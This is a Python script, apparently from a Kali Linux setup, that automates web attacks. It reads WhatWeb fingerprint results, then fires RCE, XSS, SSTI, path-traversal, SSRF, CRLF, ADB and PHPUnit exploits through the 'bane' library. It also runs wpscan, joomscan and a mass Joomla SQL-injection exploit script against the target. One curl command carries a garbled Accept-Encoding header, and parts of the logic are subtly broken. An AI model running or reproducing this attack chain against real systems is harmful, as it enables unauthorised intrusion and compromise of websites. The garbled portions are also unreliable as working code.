import bane
import codecs
import json
import os
import pandas as pd

class Bane:
    def checkprotocol(self, addr):
        protocol = addr.split(':')
        if protocol[0] in addr and protocol[0] in ['http', 'https']:
            return self.webadd.replace((protocol[0]+'://'),'')
        else:
            print('Invalid web address')
            exit(1)

    def __init__(self, webadd):
        self.path = '/home/kali/Desktop/webexploit'
        self.outpath = self.path+'/whatweboutput'
        self.webadd = webadd
        self.link = webadd
        fileoutput = self.checkprotocol(webadd)

        fin = codecs.open(os.path.join(self.outpath, 'whatweb_'+fileoutput+'.json'), 'r', 'utf-8')
        self.json = json.loads(fin.read())
        fin.close()

        keys = self.json[0]['plugins'].keys()

        ser_file = os.path.join(self.outpath, 'webservices.csv')
        ser = pd.read_csv(ser_file)
        for col in ser.columns:
            sername = ser[col].tolist()
        os_file = os.path.join(self.outpath, 'ostype.csv')
        ot = pd.read_csv(os_file)
        for col in ot.columns:
            otl = ot[col].tolist()

        for key in keys:
            if key in sername:
                search_cmd = 'search ' + key + '\n' 
                service = key
                if self.json[0]['plugins'][key].keys() in ['version']:
                    server = self.json[0]['plugins'][key]['version']
                else:
                    server = ''
            elif key == 'HTTPServer':
                if 'os' in self.json[0]['plugins']['HTTPServer'].keys():
                    for os_name in otl:
                        if os_name in self.json[0]['plugins'][key]['os'][0].lower():
                            ostype = os_name
                            break
                        else:
                            ostype = "linux"
                else:
                    ostype = "linux"
            elif key == "IP":
                IP = self.json[0]['plugins'][key]['string'][0]
                break

        check = []
        check.append(bane.rce_forms(self.link ,injection={"command":ostype},based_on='time', timeout=15 ))
        check.append(bane.rce_forms(self.link ,injection={"command":ostype},based_on='file', timeout=15 ))
        check.append(bane.vulners_search(service,version=server))
        check.append(bane.xss_forms(self.link , payload="<script>alert(123)</script>" , timeout=15 ))
        check.append(bane.ssti_forms(self.link  , timeout=15 ))
        check.append(bane.path_traversal_urls(self.link, timeout=15 ))
        check.append(bane.ssrf_urls(self.link ))
        check.append(bane.crlf_header_injection(self.link, timeout=15 ))
        check.append(bane.crlf_body_injection(self.link, timeout=15 ))
        check.append(bane.clickjacking(self.link, timeout=15 ))
        check.append(bane.hsts(self.link, timeout=15 ))
        check.append(bane.cors_misconfigurations(self.link, timeout=15 ))
        check.append(bane.adb_exploit(IP , timeout=5 ))
        check.append(bane.phpunit_exploit(self.link , timeout=15 ))

        for show in check:
            print(type(show))
            print(show)

        if os.path.exists(os.path.join(self.outpath, 'target_info_'+IP+'.json')):
            tfin = codecs.open(os.path.join(self.outpath, 'target_info_'+IP+'.json'), 'r', 'utf-8')
            tp = json.loads(tfin.read())
            tfin.close()

            for port in tp:
                os.system('curl {ip}:{port} -sH "Accept-encoding:354429474810858105277502,753225473272192695969091599085146218998458873428858279498120&68&**82302744837636557755**9,212045304725162394086 9443373783750655190662992171177571578371548748405709,035045705988280 01819032433815484769110241925758402724193417475718971298,895259892660286842061499776,****************************267816, *, ,"'.format(ip=IP, port=port))

        for key in keys:
            if key == 'apache':
                os.system("python2.7 attack-apache.py -u {}".format(self.webadd))
            elif key == 'wordpress':
                os.system("wpscan --url {}".format(self.webadd))
            elif key == 'joomla':
                os.system("joomscan --url {}".format(self.webadd))
                os.system("python2.7 joomla_sqli_mass_exploit.py")
                
                